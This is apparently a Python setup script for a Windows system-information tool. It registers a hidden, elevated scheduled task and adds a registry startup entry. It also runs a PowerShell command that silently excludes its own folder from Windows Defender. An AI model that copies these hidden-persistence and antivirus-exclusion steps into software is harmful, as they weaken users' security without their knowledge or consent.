# importing requirment_installer.py file
import requirment_installer as ri
# calling install function from requirment_installer 
# to install requirment bebore run
ri.install(["pypiwin32", "PyQt5", "screeninfo", "psutil"])


# importing required module
import sys
from time import sleep
import win32com.client
import ctypes
import os

# function to check if user run script in administrator mode
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# function to create task on task shaduler to run TempINFO.exe in administrator mode every time
def task_shaduler():
    computer_name = "" #leave all blank for current computer, current user
    computer_username = "" 
    computer_userdomain = ""
    computer_password = ""
    action_id = "TempInfoid" #arbitrary action ID
    action_path = os.path.join(os.getcwd(), "assets\TempINFO\TempINFO.exe") #executable path (could be python.exe)
    action_arguments = r'' #arguments (could be something.py)
    action_workdir = os.path.join(os.getcwd(), "assets\TempINFO") #working directory for action executable
    author = "PrasannaK" #so that end users know who you are
    description = "testing task" #so that end users can identify the task
    task_id = "tempInfo"
    task_hidden = True #set this to True to hide the task in the interface
    run_flags = "TASK_RUN_NO_FLAGS" #see dict below, use in combo with username/password

    #define constants
    TASK_CREATE_OR_UPDATE = 6
    TASK_ACTION_EXEC = 0
    RUNFLAGSENUM = {
        "TASK_RUN_NO_FLAGS"              : 0,
        "TASK_RUN_AS_SELF"               : 1,
        "TASK_RUN_IGNORE_CONSTRAINTS"    : 2,
        "TASK_RUN_USE_SESSION_ID"        : 4,
        "TASK_RUN_USER_SID"              : 8 
        }

    #connect to the scheduler (Vista/Server 2008 and above only)
    scheduler = win32com.client.Dispatch("Schedule.Service")
    scheduler.Connect(computer_name or None, computer_username or None, computer_userdomain or None, computer_password or None)
    rootFolder = scheduler.GetFolder("\\")

    #(re)define the task
    taskDef = scheduler.NewTask(0)
    taskDef.Principal.RunLevel = 1

    colActions = taskDef.Actions
    action = colActions.Create(TASK_ACTION_EXEC)
    action.ID = action_id
    action.Path = action_path
    action.WorkingDirectory = action_workdir
    action.Arguments = action_arguments

    info = taskDef.RegistrationInfo
    info.Author = author
    info.Description = description

    # settings all property
    """['AddRef', 'AllowDemandStart', 'AllowHardTerminate', 'Compatibility', 'CreateMaintenanceSettings', 
    'DeleteExpiredTaskAfter', 'DisallowStartIfOnBatteries', 'DisallowStartOnRemoteAppSession', 'Enabled', 
    'ExecutionTimeLimit', 'GetIDsOfNames', 'GetTypeInfo', 'GetTypeInfoCount', 'Hidden', 'IdleSettings', 
    'Invoke', 'MaintenanceSettings', 'MultipleInstances', 'NetworkSettings', 'Priority', 'QueryInterface',
    'Release', 'RestartCount', 'RestartInterval', 'RunOnlyIfIdle', 'RunOnlyIfNetworkAvailable','StartWhenAvailable', 
    'StopIfGoingOnBatteries', 'UseUnifiedSchedulingEngine', 'Volatile', 'WakeToRun', 'XmlText']"""
    settings = taskDef.Settings
    settings.Enabled = False
    settings.DisallowStartIfOnBatteries = False
    settings.StopIfGoingOnBatteries = False
    settings.WakeToRun = True
    settings.Hidden = task_hidden

    #register the task (create or update, just keep the task name the same)
    result = rootFolder.RegisterTaskDefinition(task_id, taskDef, TASK_CREATE_OR_UPDATE, "", "", RUNFLAGSENUM[run_flags] ) #username, password

    #run the task once
    task = rootFolder.GetTask(task_id)
    task.Enabled = True

# function for creating scheduled task shortcut to easily run TempINFO.exe
def shortcut():
    # pythoncom.CoInitialize() # remove the '#' at the beginning of the line if running in a thread.
    path = os.path.join(os.getcwd(), 'assets\TempInfo.lnk')
    target = "C:\Windows\System32\schtasks.exe"
    arguments = "/RUN /TN TempInfo"
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(path)
    shortcut.TargetPath = target
    shortcut.Arguments = arguments
    shortcut.WindowStyle = 7 # 7 - Minimized, 3 - Maximized, 1 - Normal
    shortcut.save()

# exclude current running directory (CWD) from windows defender or anti-virus
def exclude_folder():
    os.system(f"powershell -Command Add-MpPreference -ExclusionPath '{os.getcwd()}'")

# adding sys_info.pyw to registry for start automaticaly when system start
def set_startup():
    import regidit_edit as re
    re.AddToRegistry(os.path.join(os.getcwd(), 'sys_info.pyw'), "tempInfo")

# main program
def main():
    if is_admin(): # checking if script is running in administrator mode
        import sys_info  # importing sys_info.py file
        task_shaduler()  # calling task_shaduler() function to shadule task in task shaduler
        sleep(1)         # wait for 1s
        shortcut()       # calling shortcut() function to create shaduled task shortcut
        sleep(1)         # wait for 1s
        exclude_folder() # calling exclude_folder function for exclude running folder from defender
        set_startup()    # calling registry setup function
        sys_info.load()  # calling load() function from sys_load.py to show system information in GUI
    else: # else ask user to run this script in administrator mode
        # to re-run this script with administrator mode if user allow's
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, "sys_info_setup.py")

# calling main function
if __name__ == '__main__':
    main()
    input("SetUp successful...\npress any key to close")
